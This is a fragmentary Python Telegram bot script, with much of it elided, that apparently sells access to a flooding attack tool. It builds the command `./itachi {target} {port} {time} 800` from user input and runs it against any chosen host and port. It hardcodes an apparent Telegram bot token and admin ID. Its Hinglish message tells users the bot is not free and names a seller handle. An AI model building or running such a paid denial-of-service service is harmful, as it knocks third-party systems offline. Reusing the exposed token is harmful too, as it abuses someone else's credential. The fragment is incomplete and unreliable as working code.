...
bot = telebot.TeleBot('7747598023:AAGfi-m_9gw2L_4McP6z62OjGlbc-AavNVY')
# Admin user IDs
admin_id = {'1724246173'}
        ...
        if len(command) == 4:
            ...
            try:
                ...
                if time > 1000:
                    ...
                    full_command = f"./itachi {target} {port} {time} 800"
...
def show_command_logs(message):
    ...
    if user_id in users:
        ...
        response = "❌ YE BOT FREE NAHI H JISE LENA H BUY KARO @mastbelaa❌!!"
